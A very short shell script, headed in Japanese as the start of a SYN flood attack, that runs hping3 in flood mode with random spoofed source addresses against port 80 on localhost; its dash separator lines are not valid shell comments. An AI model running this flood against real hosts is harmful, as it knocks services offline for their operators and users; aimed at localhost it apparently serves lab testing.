#!/bin/sh

-----------------------------------
#SYN Flood Attack開始(hping3)
-----------------------------------
sudo hping3 --rand-source --flood -S -p 80 localhost

